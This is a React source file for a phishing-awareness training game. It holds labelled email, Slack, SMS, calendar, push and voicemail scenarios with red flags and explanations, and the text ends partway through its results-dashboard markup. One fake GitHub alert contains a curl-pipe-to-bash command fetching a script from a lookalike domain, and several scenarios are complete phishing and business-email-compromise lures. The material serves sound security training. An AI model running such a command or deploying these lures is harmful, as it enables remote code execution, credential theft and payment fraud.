import { useState, useEffect, useCallback, useRef } from "react";

// ─── DATA ───────────────────────────────────────────────────────────────────────

const SCENARIOS = [
  // ── STANDARD MODE ──────────────────────────────────────────────────────────
  {
    id: 1,
    type: "email",
    mode: "standard",
    isPhish: true,
    difficulty: 1,
    category: "Credential Harvesting",
    from: "IT-Support@yourcompanny.com",
    fromDisplay: "IT Support Team",
    to: "you@company.com",
    subject: "⚠️ Urgent: Password Expires in 2 Hours",
    timestamp: "9:14 AM",
    body: `Hi,

Your corporate password will expire in 2 hours. To avoid being locked out, please verify your credentials immediately using the secure link below.

👉 Reset Password Now: https://yourcompanny-secure.com/reset

If you do not act within 2 hours, your account will be suspended and you will lose access to all company systems.

Best regards,
IT Support Team
Your Company Inc.`,
    redFlags: [
      "Misspelled domain: 'yourcompanny.com' (double 'n')",
      "Urgent time pressure to create panic",
      "Suspicious external link doesn't match company domain",
      "Generic greeting — no personalized name",
    ],
    explanation:
      "This is a classic credential harvesting attack. The misspelled sender domain, artificial urgency, and suspicious link are hallmarks of phishing. Real IT departments use internal portals and don't threaten immediate lockout.",
  },
  {
    id: 2,
    type: "email",
    mode: "standard",
    isPhish: false,
    difficulty: 1,
    category: "Legitimate",
    from: "benefits@company.com",
    fromDisplay: "HR Benefits Team",
    to: "you@company.com",
    subject: "Open Enrollment Reminder — Deadline Nov 15",
    timestamp: "10:30 AM",
    body: `Hi Team,

This is a friendly reminder that open enrollment for 2026 benefits closes on November 15th.

To review and update your selections, log into the HR portal at hr.company.com/benefits (you'll need your SSO credentials).

If you have questions, contact the benefits team at ext. 4200 or stop by HR on the 3rd floor.

Thank you,
Jessica Martinez
Benefits Administrator
HR Department`,
    redFlags: [],
    explanation:
      "This is a legitimate internal HR communication. It uses the correct company domain, references an internal portal with SSO, provides a phone extension and physical location for follow-up, and has a named sender with a real title.",
  },
  {
    id: 3,
    type: "slack",
    mode: "standard",
    isPhish: true,
    difficulty: 1,
    category: "Impersonation",
    from: "CEO-David.Chen",
    channel: "Direct Message",
    timestamp: "11:47 AM",
    body: `Hey, are you at your desk? I need you to handle something urgently and confidentially.

I'm in back-to-back meetings so I can't call. Can you purchase 5 Apple gift cards ($200 each) for a client appreciation event? I'll reimburse you. 

Please send photos of the cards and PINs to this number: +1-555-0199

This is time-sensitive. Don't loop anyone else in.

- David`,
    redFlags: [
      "Gift card request — #1 sign of impersonation scam",
      "Requests secrecy: 'Don't loop anyone else in'",
      "CEO wouldn't use Slack DM for purchases",
      "Asks you to send PINs to a personal number",
      "Unusual username format with hyphen",
    ],
    explanation:
      "This is CEO/executive impersonation fraud (Business Email Compromise). The gift card request, secrecy demand, artificial urgency, and request to send PINs to a phone number are major red flags. Always verify such requests through a known phone number.",
  },
  {
    id: 4,
    type: "sms",
    mode: "standard",
    isPhish: true,
    difficulty: 2,
    category: "Smishing",
    from: "+1 (555) 012-3456",
    timestamp: "2:33 PM",
    body: `[Company IT] We detected unusual sign-in activity on your account from Moscow, Russia. If this wasn't you, secure your account now: https://bit.ly/3xR9kT2

Reply STOP to unsubscribe.`,
    redFlags: [
      "Shortened URL hides the real destination",
      "IT departments don't send security alerts via SMS",
      "Creates fear with 'Moscow, Russia' location",
      "Generic sender — no IT ticket number or reference",
    ],
    explanation:
      "This smishing (SMS phishing) attack uses a shortened URL to mask a malicious destination and leverages fear of foreign account access. Legitimate IT security alerts come through official channels with ticket numbers, not random text messages.",
  },
  {
    id: 5,
    type: "calendar",
    mode: "standard",
    isPhish: true,
    difficulty: 2,
    category: "Calendar Phishing",
    from: "meeting-invite@zoom-meetings-corp.com",
    fromDisplay: "Zoom Meetings",
    subject: "Board of Directors — Emergency Session",
    timestamp: "3:00 PM",
    body: `You've been added to an emergency board meeting.

📅 Today, 4:00 PM EST
📍 Virtual — Join via Zoom

Click to join: https://zoom-meetings-corp.com/j/8847261

Agenda:
• Emergency budget reallocation
• Confidential personnel matter

Please do not forward this invitation. Attendance is mandatory.`,
    redFlags: [
      "Fake Zoom domain: 'zoom-meetings-corp.com' (real: zoom.us)",
      "Unsolicited emergency meeting with no prior context",
      "Requests secrecy: 'Do not forward'",
      "Vague but alarming agenda to lure clicks",
    ],
    explanation:
      "Calendar invite phishing exploits trust in meeting platforms. The fraudulent Zoom domain, unsolicited emergency framing, and secrecy request are designed to create urgency and prevent verification. Real Zoom links use zoom.us domains.",
  },
  {
    id: 6,
    type: "email",
    mode: "standard",
    isPhish: false,
    difficulty: 2,
    category: "Legitimate",
    from: "jira-notifications@atlassian.net",
    fromDisplay: "Jira",
    to: "you@company.com",
    subject: "[PROJ-1247] Bug fix deployed to staging",
    timestamp: "4:15 PM",
    body: `Marcus Rivera updated PROJ-1247:

Status changed: In Review → Deployed to Staging

Comment: "Fix for the null pointer exception in the payment module has been deployed to staging. QA team — please verify before EOD."

View issue: https://company.atlassian.net/browse/PROJ-1247

— This message was sent by Atlassian Jira (v9.12.0#9120)`,
    redFlags: [],
    explanation:
      "This is a legitimate Jira notification. It comes from the correct Atlassian domain, references a specific ticket number, names a real team member, links to the company's Atlassian instance, and includes standard Jira formatting and version info.",
  },
  {
    id: 7,
    type: "email",
    mode: "standard",
    isPhish: true,
    difficulty: 2,
    category: "Vendor Impersonation",
    from: "billing@docusign-notifications.com",
    fromDisplay: "DocuSign",
    to: "you@company.com",
    subject: "Document Ready for Signature: NDA — Renewal Agreement",
    timestamp: "8:02 AM",
    body: `Hello,

A document has been sent to you for electronic signature.

Document: NDA Renewal Agreement — 2026
Sent by: Legal Department (legal@company.com)

REVIEW DOCUMENT: https://docusign-notifications.com/sign/x8hG2k

This document expires in 24 hours.

Powered by DocuSign®`,
    redFlags: [
      "Fake domain: 'docusign-notifications.com' (real: docusign.net)",
      "24-hour expiration creates artificial urgency",
      "Generic greeting instead of your name",
      "Spoofed internal sender to build trust",
    ],
    explanation:
      "This impersonates DocuSign using a lookalike domain. Real DocuSign emails come from @docusign.net or @docusign.com. The fake domain, urgency, and spoofed internal sender are designed to trick you into entering credentials on a fake signing page.",
  },

  // ── ADVANCED MODE ─────────────────────────────────────────────────────────
  {
    id: 8,
    type: "push",
    mode: "advanced",
    isPhish: true,
    difficulty: 3,
    category: "MFA Fatigue Attack",
    from: "Authenticator App",
    timestamp: "11:58 PM",
    body: `🔔 Sign-in request
Location: Chicago, IL
App: Microsoft 365

[Approve] [Deny]

⚠️ You've received 6 push notifications in the last 3 minutes. You are not currently attempting to sign in.`,
    redFlags: [
      "Multiple rapid push notifications you didn't initiate",
      "Late-night timing when you're not working",
      "Location doesn't match your actual location",
      "Attacker is bombarding you hoping you'll tap Approve",
    ],
    explanation:
      "MFA fatigue (push bombing) is when an attacker who already has your password repeatedly triggers MFA prompts, hoping you'll approve one out of frustration or confusion. Always deny unexpected prompts and immediately report to IT / change your password.",
  },
  {
    id: 9,
    type: "email",
    mode: "advanced",
    isPhish: true,
    difficulty: 3,
    category: "OAuth Consent Phishing",
    from: "no-reply@accounts.google.com",
    fromDisplay: "Google",
    to: "you@company.com",
    subject: "Third-party app requesting access to your account",
    timestamp: "10:22 AM",
    body: `The app "Secure Doc Viewer Pro" is requesting permission to access your Google Account (you@company.com).

This app wants to:
✅ Read, compose, send, and permanently delete all your email
✅ See, edit, share, and permanently delete all Google Drive files
✅ See, edit, and delete all calendar events

Grant Access: https://accounts.google.com/o/oauth2/auth?client_id=8847261&scope=full_access&redirect_uri=https://secdocviewer.app/callback

This request originated from: secdocviewer.app

If you did not initiate this request, ignore this email.`,
    redFlags: [
      "Excessive permissions: full email, Drive, and Calendar access",
      "Unfamiliar app name: 'Secure Doc Viewer Pro'",
      "Redirect URI points to unknown third-party domain",
      "You didn't initiate this OAuth flow",
    ],
    explanation:
      "OAuth consent phishing abuses legitimate Google OAuth flows to trick users into granting malicious apps full account access. The excessive permission scope and unknown app are major red flags. Unlike fake login pages, this actually uses Google's real infrastructure.",
  },
  {
    id: 10,
    type: "email",
    mode: "advanced",
    isPhish: true,
    difficulty: 3,
    category: "Vendor Invoice Fraud",
    from: "accounting@acme-supp1ies.com",
    fromDisplay: "Acme Supplies — Accounting",
    to: "ap@company.com",
    subject: "Updated Banking Information — Invoice #INV-2026-0892",
    timestamp: "9:45 AM",
    body: `Dear Accounts Payable,

Please be advised that Acme Supplies has recently changed our banking institution. Effective immediately, all future payments should be directed to our new account:

Bank: First National Trust
Routing: 021000089
Account: 4458-7721-0093

Attached: Invoice #INV-2026-0892 ($47,250.00)

Please update your records and process this invoice at your earliest convenience. If you have questions, contact me at this email.

Kind regards,
Robert Tran
Senior Accountant
Acme Supplies LLC`,
    redFlags: [
      "Domain spoofing: 'acme-supp1ies.com' uses '1' instead of 'l'",
      "Requests banking change — classic vendor fraud tactic",
      "Asks to bypass normal verification procedures",
      "Contact method only via this (potentially compromised) email",
      "Large dollar amount to maximize theft",
    ],
    explanation:
      "Vendor invoice fraud / Business Email Compromise (BEC) is one of the most costly cyberattacks. Attackers impersonate known vendors and request banking changes. Always verify bank change requests through a known phone number from your records, never from the email itself.",
  },
  {
    id: 11,
    type: "voicemail",
    mode: "advanced",
    isPhish: true,
    difficulty: 3,
    category: "Deepfake Voice",
    from: "CFO — Patricia Nguyen",
    timestamp: "7:12 AM",
    body: `[AI-GENERATED VOICE TRANSCRIPT]

"Hey, it's Patricia. I know it's early but I need your help with something before the 9 AM board call. We need to process a wire transfer of $125,000 to close the Morrison acquisition before the deadline. I've already gotten verbal approval from David. The receiving account details are in the email I just sent you. Please process it immediately and confirm back to me via text at my personal number — I'm having issues with my work phone. Thanks, I owe you one."

[Voice confidence score: 94% match to known voiceprint]
[Call origin: VoIP — unverified number]`,
    redFlags: [
      "Urgent wire transfer request outside normal process",
      "Claims verbal-only approval with no documentation",
      "Directs follow-up to personal number, not work channels",
      "VoIP/unverified call origin",
      "Early morning timing to catch you off-guard",
      "AI-generated voice — deepfake technology",
    ],
    explanation:
      "Deepfake voice attacks use AI to clone executives' voices from public recordings. This combines voice cloning with classic BEC tactics: urgency, authority, and process bypass. Always verify wire transfer requests through established procedures regardless of who appears to be calling.",
  },
  {
    id: 12,
    type: "slack",
    mode: "advanced",
    isPhish: true,
    difficulty: 3,
    category: "Supply Chain / Trusted Tool",
    from: "GitHub Bot",
    channel: "#dev-ops",
    timestamp: "3:18 PM",
    body: `🚨 **Security Alert — Critical Dependency Vulnerability**

A critical vulnerability (CVE-2026-44271) has been detected in \`auth-middleware v3.2.1\` used in your repository \`company/api-gateway\`.

**Severity:** Critical (CVSS 9.8)
**Impact:** Remote code execution

A fix is available. Run this command to patch immediately:

\`\`\`
curl -sL https://gh-security-patch.dev/fix.sh | bash
\`\`\`

Or review the advisory: https://gh-security-patch.dev/CVE-2026-44271

⏰ Unpatched systems will be flagged in 24 hours.`,
    redFlags: [
      "External domain 'gh-security-patch.dev' — not github.com",
      "Piping curl to bash is a dangerous pattern",
      "Artificial 24-hour deadline creates pressure",
      "CVE number should be verified on official databases",
      "Bot posting in channel could be a compromised integration",
    ],
    explanation:
      "Supply chain attacks exploit developer trust in tools and security alerts. This fake GitHub bot uses a lookalike domain and the dangerous 'curl | bash' pattern to execute arbitrary code. Always verify CVEs on official databases (NVD/NIST) and never pipe untrusted URLs to bash.",
  },
  {
    id: 13,
    type: "email",
    mode: "advanced",
    isPhish: false,
    difficulty: 2,
    category: "Legitimate",
    from: "security@company.com",
    fromDisplay: "Information Security Team",
    to: "all-staff@company.com",
    subject: "Mandatory: Annual Security Awareness Training Due by Dec 1",
    timestamp: "9:00 AM",
    body: `Hi everyone,

It's that time of year again! Annual security awareness training must be completed by December 1st.

To complete your training:
1. Log into the Learning Portal at learn.company.com (SSO)
2. Navigate to "Required Training"
3. Complete the "2026 Security Awareness" module (~30 min)

Your completion is tracked automatically. Managers will receive a report of incomplete training on Dec 2.

Questions? Email security@company.com or join our #security-questions Slack channel.

Thanks for keeping us all safe,
Mike Torres
Security Awareness Lead
Information Security | Ext. 3847`,
    redFlags: [],
    explanation:
      "This is legitimate internal security training communication. It uses the correct company domain, references internal systems with SSO, provides multiple verified contact methods (email, Slack, extension), has a named sender with title, and follows standard corporate communication patterns.",
  },
  {
    id: 14,
    type: "sms",
    mode: "advanced",
    isPhish: false,
    difficulty: 2,
    category: "Legitimate",
    from: "Company IT (Verified)",
    timestamp: "2:00 PM",
    body: `[Company IT] Your new laptop is ready for pickup at the IT Help Desk (Building A, Room 102). Reference ticket #IT-28847. Please bring your employee badge. Hours: M-F 8AM-5PM. Questions? Call ext. 5000.`,
    redFlags: [],
    explanation:
      "This is a legitimate IT notification. It references a specific ticket number, provides a physical location, doesn't contain any links, asks for in-person badge verification, and provides an internal extension for questions.",
  },
];

const ACTIONS = [
  { id: "report", label: "Report to IT", icon: "🛡️", color: "#ef4444" },
  { id: "ignore", label: "Ignore / Delete", icon: "🗑️", color: "#f59e0b" },
  { id: "reply", label: "Reply / Engage", icon: "💬", color: "#3b82f6" },
  { id: "escalate", label: "Escalate to Manager", icon: "⬆️", color: "#8b5cf6" },
];

const CORRECT_ACTIONS = {
  true: ["report", "escalate"],
  false: ["reply", "ignore"],
};

const TYPE_META = {
  email: { icon: "📧", label: "Email", bg: "#1a1a2e", accent: "#4361ee" },
  slack: { icon: "💬", label: "Slack Message", bg: "#1a1a2e", accent: "#36b37e" },
  sms: { icon: "📱", label: "SMS / Text", bg: "#1a1a2e", accent: "#00b4d8" },
  calendar: { icon: "📅", label: "Calendar Invite", bg: "#1a1a2e", accent: "#f77f00" },
  push: { icon: "🔔", label: "Push Notification", bg: "#1a1a2e", accent: "#e63946" },
  voicemail: { icon: "🎙️", label: "Voicemail Transcript", bg: "#1a1a2e", accent: "#9b5de5" },
};

// ─── HELPER COMPONENTS ──────────────────────────────────────────────────────

function TypeBadge({ type }) {
  const meta = TYPE_META[type];
  return (
    <span
      style={{
        display: "inline-flex",
        alignItems: "center",
        gap: 6,
        padding: "4px 12px",
        borderRadius: 20,
        fontSize: 12,
        fontWeight: 600,
        background: meta.accent + "22",
        color: meta.accent,
        border: `1px solid ${meta.accent}44`,
        letterSpacing: 0.5,
        textTransform: "uppercase",
      }}
    >
      {meta.icon} {meta.label}
    </span>
  );
}

function ProgressBar({ current, total }) {
  const pct = (current / total) * 100;
  return (
    <div style={{ display: "flex", alignItems: "center", gap: 12, width: "100%" }}>
      <div
        style={{
          flex: 1,
          height: 6,
          background: "#1e293b",
          borderRadius: 3,
          overflow: "hidden",
        }}
      >
        <div
          style={{
            width: `${pct}%`,
            height: "100%",
            background: "linear-gradient(90deg, #4361ee, #7209b7)",
            borderRadius: 3,
            transition: "width 0.5s ease",
          }}
        />
      </div>
      <span style={{ fontSize: 13, color: "#94a3b8", fontWeight: 600, minWidth: 50 }}>
        {current}/{total}
      </span>
    </div>
  );
}

function Timer({ seconds }) {
  const m = Math.floor(seconds / 60);
  const s = seconds % 60;
  return (
    <span style={{ fontVariantNumeric: "tabular-nums", fontFamily: "'JetBrains Mono', monospace" }}>
      {m}:{s.toString().padStart(2, "0")}
    </span>
  );
}

// ─── MESSAGE RENDERER ───────────────────────────────────────────────────────

function MessageCard({ scenario }) {
  const meta = TYPE_META[scenario.type];
  return (
    <div
      style={{
        background: "#0f172a",
        border: `1px solid ${meta.accent}33`,
        borderRadius: 16,
        overflow: "hidden",
        boxShadow: `0 0 40px ${meta.accent}11`,
      }}
    >
      {/* Header bar */}
      <div
        style={{
          background: `linear-gradient(135deg, ${meta.accent}15, ${meta.accent}08)`,
          borderBottom: `1px solid ${meta.accent}22`,
          padding: "14px 20px",
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
        }}
      >
        <TypeBadge type={scenario.type} />
        <span style={{ fontSize: 12, color: "#64748b" }}>{scenario.timestamp}</span>
      </div>

      {/* Message metadata */}
      <div style={{ padding: "16px 20px 0" }}>
        {scenario.from && (
          <div style={{ marginBottom: 6 }}>
            <span style={{ fontSize: 11, color: "#64748b", textTransform: "uppercase", letterSpacing: 1 }}>
              From
            </span>
            <div style={{ fontSize: 14, color: "#e2e8f0", fontWeight: 600, marginTop: 2 }}>
              {scenario.fromDisplay || scenario.from}
              {scenario.fromDisplay && (
                <span style={{ fontWeight: 400, color: "#64748b", fontSize: 12, marginLeft: 8 }}>
                  &lt;{scenario.from}&gt;
                </span>
              )}
            </div>
          </div>
        )}
        {scenario.channel && (
          <div style={{ marginBottom: 6 }}>
            <span style={{ fontSize: 11, color: "#64748b", textTransform: "uppercase", letterSpacing: 1 }}>
              Channel
            </span>
            <div style={{ fontSize: 14, color: "#e2e8f0", marginTop: 2 }}>{scenario.channel}</div>
          </div>
        )}
        {scenario.subject && (
          <div style={{ marginBottom: 6 }}>
            <span style={{ fontSize: 11, color: "#64748b", textTransform: "uppercase", letterSpacing: 1 }}>
              Subject
            </span>
            <div style={{ fontSize: 15, color: "#f1f5f9", fontWeight: 700, marginTop: 2 }}>
              {scenario.subject}
            </div>
          </div>
        )}
      </div>

      {/* Divider */}
      <div style={{ height: 1, background: "#1e293b", margin: "12px 20px" }} />

      {/* Body */}
      <div
        style={{
          padding: "4px 20px 20px",
          fontSize: 14,
          lineHeight: 1.7,
          color: "#cbd5e1",
          whiteSpace: "pre-wrap",
          fontFamily: scenario.type === "voicemail" ? "'JetBrains Mono', monospace" : "inherit",
          ...(scenario.type === "voicemail" ? { fontStyle: "italic", fontSize: 13 } : {}),
        }}
      >
        {scenario.body}
      </div>

      {scenario.mode === "advanced" && (
        <div
          style={{
            margin: "0 20px 16px",
            padding: "8px 12px",
            background: "#7209b722",
            borderRadius: 8,
            border: "1px solid #7209b744",
            fontSize: 11,
            color: "#a78bfa",
            fontWeight: 600,
            textTransform: "uppercase",
            letterSpacing: 1,
          }}
        >
          ⚡ Advanced Scenario — {scenario.category}
        </div>
      )}
    </div>
  );
}

// ─── RESULT OVERLAY ─────────────────────────────────────────────────────────

function ResultOverlay({ scenario, userVerdict, userAction, isCorrectVerdict, isCorrectAction, onContinue }) {
  const allCorrect = isCorrectVerdict && isCorrectAction;
  const partialCorrect = isCorrectVerdict && !isCorrectAction;

  return (
    <div
      style={{
        position: "fixed",
        inset: 0,
        zIndex: 100,
        background: "rgba(2, 6, 23, 0.92)",
        backdropFilter: "blur(12px)",
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        padding: 20,
        animation: "fadeIn 0.3s ease",
      }}
    >
      <div
        style={{
          maxWidth: 560,
          width: "100%",
          maxHeight: "90vh",
          overflowY: "auto",
          background: "#0f172a",
          border: `1px solid ${allCorrect ? "#22c55e" : partialCorrect ? "#f59e0b" : "#ef4444"}44`,
          borderRadius: 20,
          padding: 32,
          boxShadow: `0 0 60px ${allCorrect ? "#22c55e" : partialCorrect ? "#f59e0b" : "#ef4444"}15`,
        }}
      >
        {/* Verdict */}
        <div style={{ textAlign: "center", marginBottom: 24 }}>
          <div style={{ fontSize: 48, marginBottom: 8 }}>
            {allCorrect ? "✅" : partialCorrect ? "⚠️" : "❌"}
          </div>
          <div
            style={{
              fontSize: 22,
              fontWeight: 800,
              color: allCorrect ? "#22c55e" : partialCorrect ? "#f59e0b" : "#ef4444",
              letterSpacing: -0.5,
            }}
          >
            {allCorrect ? "Excellent!" : partialCorrect ? "Partially Correct" : "Incorrect"}
          </div>
          <div style={{ fontSize: 14, color: "#94a3b8", marginTop: 4 }}>
            {isCorrectVerdict
              ? `You correctly identified this as ${scenario.isPhish ? "phishing" : "legitimate"}.`
              : `This was actually ${scenario.isPhish ? "phishing" : "legitimate"}, not ${
                  userVerdict === "phish" ? "phishing" : "legitimate"
                }.`}
            {!isCorrectAction &&
              isCorrectVerdict &&
              " However, your chosen action wasn't optimal."}
          </div>
        </div>

        {/* Red Flags / Legitimacy Indicators */}
        {scenario.isPhish && scenario.redFlags.length > 0 && (
          <div
            style={{
              background: "#ef444411",
              border: "1px solid #ef444433",
              borderRadius: 12,
              padding: 16,
              marginBottom: 16,
            }}
          >
            <div
              style={{
                fontSize: 12,
                fontWeight: 700,
                color: "#ef4444",
                textTransform: "uppercase",
                letterSpacing: 1,
                marginBottom: 10,
              }}
            >
              🚩 Red Flags
            </div>
            {scenario.redFlags.map((flag, i) => (
              <div
                key={i}
                style={{
                  display: "flex",
                  gap: 8,
                  marginBottom: 6,
                  fontSize: 13,
                  color: "#fca5a5",
                  lineHeight: 1.5,
                }}
              >
                <span style={{ flexShrink: 0 }}>•</span>
                <span>{flag}</span>
              </div>
            ))}
          </div>
        )}

        {/* Explanation */}
        <div
          style={{
            background: "#1e293b",
            borderRadius: 12,
            padding: 16,
            marginBottom: 24,
          }}
        >
          <div
            style={{
              fontSize: 12,
              fontWeight: 700,
              color: "#4361ee",
              textTransform: "uppercase",
              letterSpacing: 1,
              marginBottom: 8,
            }}
          >
            💡 Analysis
          </div>
          <div style={{ fontSize: 13, color: "#cbd5e1", lineHeight: 1.7 }}>
            {scenario.explanation}
          </div>
        </div>

        {/* Continue Button */}
        <button
          onClick={onContinue}
          style={{
            width: "100%",
            padding: "14px 24px",
            background: "linear-gradient(135deg, #4361ee, #7209b7)",
            color: "#fff",
            border: "none",
            borderRadius: 12,
            fontSize: 15,
            fontWeight: 700,
            cursor: "pointer",
            letterSpacing: 0.5,
            transition: "transform 0.15s, box-shadow 0.15s",
          }}
          onMouseOver={(e) => {
            e.currentTarget.style.transform = "translateY(-1px)";
            e.currentTarget.style.boxShadow = "0 8px 25px rgba(67, 97, 238, 0.3)";
          }}
          onMouseOut={(e) => {
            e.currentTarget.style.transform = "translateY(0)";
            e.currentTarget.style.boxShadow = "none";
          }}
        >
          Continue →
        </button>
      </div>
    </div>
  );
}

// ─── METRICS DASHBOARD ──────────────────────────────────────────────────────

function MetricsDashboard({ results, totalTime, onRestart, onReview }) {
  const total = results.length;
  const correctVerdicts = results.filter((r) => r.isCorrectVerdict).length;
  const correctActions = results.filter((r) => r.isCorrectAction).length;
  const perfectRounds = results.filter((r) => r.isCorrectVerdict && r.isCorrectAction).length;
  const avgTime = total > 0 ? Math.round(results.reduce((s, r) => s + r.timeSpent, 0) / total) : 0;

  const accuracy = total > 0 ? Math.round((correctVerdicts / total) * 100) : 0;
  const actionScore = total > 0 ? Math.round((correctActions / total) * 100) : 0;

  // Category breakdown
  const categoryStats = {};
  results.forEach((r) => {
    const cat = r.scenario.category;
    if (!categoryStats[cat]) categoryStats[cat] = { total: 0, correct: 0 };
    categoryStats[cat].total++;
    if (r.isCorrectVerdict) categoryStats[cat].correct++;
  });

  // Phish vs legit breakdown
  const phishResults = results.filter((r) => r.scenario.isPhish);
  const legitResults = results.filter((r) => !r.scenario.isPhish);
  const phishAcc = phishResults.length > 0
    ? Math.round((phishResults.filter((r) => r.isCorrectVerdict).length / phishResults.length) * 100)
    : 0;
  const legitAcc = legitResults.length > 0
    ? Math.round((legitResults.filter((r) => r.isCorrectVerdict).length / legitResults.length) * 100)
    : 0;

  // Grade
  let grade, gradeColor, gradeMsg;
  if (accuracy >= 90 && actionScore >= 80) {
    grade = "A";
    gradeColor = "#22c55e";
    gradeMsg = "Security Champion — You're a phishing detection expert!";
  } else if (accuracy >= 75) {
    grade = "B";
    gradeColor = "#4361ee";
    gradeMsg = "Solid Awareness — Good instincts, a few blind spots to address.";
  } else if (accuracy >= 60) {
    grade = "C";
    gradeColor = "#f59e0b";
    gradeMsg = "Needs Improvement — You're vulnerable to several attack types.";
  } else {
    grade = "D";
    gradeColor = "#ef4444";
    gradeMsg = "High Risk — Recommend immediate additional training.";
  }

  // Weak spots
  const weakSpots = Object.entries(categoryStats)
    .filter(([_, s]) => s.correct / s.total < 0.75)
    .map(([cat]) => cat);

  return (
    <div
      style={{
        minHeight: "100vh",
        background: "#020617",
        padding: "40px 20px",
        fontFamily: "'DM Sans', system-ui, sans-serif",
      }}
    >
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,300;0,9..40,500;0,9..40,700;0,9..40,800;1,9..40,400&family=JetBrains+Mono:wght@400;600&display=swap');
      `}</style>

      <div style={{ maxWidth: 700, margin: "0 auto" }}>
        {/* Header */}
        <div style={{ textAlign: "center", marginBottom: 40 }}>
          <div style={{ fontSize: 14, color: "#64748b", textTransform: "uppercase", letterSpacing: 2, marginBottom: 8 }}>
            Training Complete
          </div>
          <h1 style={{ fontSize: 36, fontWeight: 800, color: "#f1f5f9", margin: 0, letterSpacing: -1 }}>
            Your Results
          </h1>
        </div>

        {/* Grade card */}
        <div
          style={{
            background: "#0f172a",
            border: `2px solid ${gradeColor}44`,
            borderRadius: 20,
            padding: 32,
            textAlign: "center",
            marginBottom: 24,
            boxShadow: `0 0 60px ${gradeColor}11`,
          }}
        >
          <div
            style={{
              width: 80,
              height: 80,
              borderRadius: "50%",
              background: `${gradeColor}22`,
              border: `3px solid ${gradeColor}`,
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              margin: "0 auto 16px",
              fontSize: 36,
              fontWeight: 800,
              color: gradeColor,
            }}
          >
            {grade}
          </div>
          <div style={{ fontSize: 16, color: "#e2e8f0", fontWeight: 600, marginBottom: 4 }}>{gradeMsg}</div>
          <div style={{ fontSize: 13, color: "#64748b" }}>
            Completed in <Timer seconds={totalTime} /> •{" "}
            {total} scenarios
          </div>
        </div>

        {/* Stat grid */}
        <div
          style={{
            display: "grid",
            gridTemplateColumns: "repeat(auto-fit, minmax(140px, 1fr))",
            gap: 12,
            marginBottom: 24,
          }}
        >
          {[
            { label: "Detection Accuracy", value: `${accuracy}%`, color: accuracy >= 75 ? "#22c55e" : "#ef4444" },
            { label: "Action Score", value: `${actionScore}%`, color: actionScore >= 75 ? "#22c55e" : "#f59e0b" },
            { label: "Perfect Rounds", value: `${perfectRounds}/${total}`, color: "#4361ee" },
            { label: "Avg Response Time", value: `${avgTime}s`, color: avgTime <= 30 ? "#22c55e" : "#f59e0b" },
          ].map((stat, i) => (
            <div
              key={i}
              style={{
                background: "#0f172a",
                border: "1px solid #1e293b",
                borderRadius: 14,
                padding: "18px 16px",
                textAlign: "center",
              }}
            >
              <div style={{ fontSize: 26, fontWeight: 800, color: stat.color, marginBottom: 4, fontFamily: "'JetBrains Mono', monospace" }}>
                {stat.value}
              </div>
              <div style={{ fontSize: 11, color: "#64748b", textTransform: "uppercase", letterSpacing: 0.8 }}>
                {stat.label}
              </div>
            </div>
          ))}
        </div>

        {/* Detection breakdown */}
        <div
          style={{
            background: "#0f172a",
            border: "1px solid #1e293b",
            borderRadius: 16,
            padding: 24,
            marginBottom: 24,
          }}
        >
          <div style={{ fontSize: 13, fontWeight: 700, color: "#94a3b8", textTransform: "uppercase", letterSpacing: 1, marginBottom: 16 }}>
            Detection Breakdown
          </div>
          <div style={{ display: "flex", gap: 16, flexWrap: "wrap" }}>
            <div style={{ flex: 1, minWidth: 120 }}>
              <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 6 }}>
                <span style={{ fontSize: 13, color: "#e2e8f0" }}>Phishing Detection</span>
                <span style={{ fontSize: 13, color: phishAcc >= 75 ? "#22c55e" : "#ef4444", fontWeight: 700, fontFamily: "'JetBrains Mono', monospace" }}>{phishAcc}%</span>
              </div>
              <div style={{ height: 8, background: "#1e293b", borderRadius: 4, overflow: "hidden" }}>
                <div style={{ width: `${phishAcc}%`, height: "100%", background: phishAcc >= 75 ? "#22c55e" : "#ef4444", borderRadius: 4, transition: "width 1s ease" }} />
              </div>
            </div>
            <div style={{ flex: 1, minWidth: 120 }}>
              <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 6 }}>
                <span style={{ fontSize: 13, color: "#e2e8f0" }}>Legit Identification</span>
                <span style={{ fontSize: 13, color: legitAcc >= 75 ? "#22c55e" : "#ef4444", fontWeight: 700, fontFamily: "'JetBrains Mono', monospace" }}>{legitAcc}%</span>
              </div>
              <div style={{ height: 8, background: "#1e293b", borderRadius: 4, overflow: "hidden" }}>
                <div style={{ width: `${legitAcc}%`, height: "100%", background: legitAcc >= 75 ? "#22c55e" : "#ef4444", borderRadius: 4, transition: "width 1s ease" }} />
              </div>
            </div>
          </div>
        </div>

        {/* Category Performance */}
        <div
          style={{
            background: "#0f172a",
            border: "1px solid #1e293b",
            borderRadius: 16,
            padding: 24,
            marginBottom: 24,
          }}
        >
          <div style={{ fontSize: 13, fontWeight: 700, color: "#94a3b8", textTransform: "uppercase", letterSpacing: 1, marginBottom: 16 }}>
            Performance by Attack Type
          </div>
          {Object.entries(categoryStats).map(([cat, stats]) => {
            const pct = Math.round((stats.correct / stats.total) * 100);
            return (
              <div key={cat} style={{ marginBottom: 12 }}>
                <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 4 }}>
                  <span style={{ fontSize: 13, color: "#e2e8f0" }}>{cat}</span>
                  <span
                    style={{
                      fontSize: 12,
                      color: pct >= 75 ? "#22c55e" : pct >= 50 ? "#f59e0b" : "#ef4444",
                      fontWeight: 600,
                      fontFamily: "'JetBrains Mono', monospace",
                    }}
                  >
                    {stats.correct}/{stats.total} ({pct}%)
                  </span>
                </div>
                <div style={{ height: 5, background: "#1e293b", borderRadius: 3, overflow: "hidden" }}>
                  <div
                    style={{
                      width: `${pct}%`,
                      height: "100%",
                      background: pct >= 75 ? "#22c55e" : pct >= 50 ? "#f59e0b" : "#ef4444",
                      borderRadius: 3,
                    }}
                  />
                </div>
              </div>
            );
          })}
        </div>

        {/* Weak Spots */}
        {weakSpots.length > 0 && (
          <div
            style={{
              background: "#ef444411",
              border: "1px solid #ef444433",
              borderRadius: 16,
              padding: 20,
              marginBottom: 24,
            }}
          >
            <div style={{ fontSize: 13, fontWeight: 700, color: "#ef4444", textTransform: "uppercase", letterSpacing: 1, marginBottom: 8 }}>
              ⚠️ Weak Spots — Focus Areas
            </div>
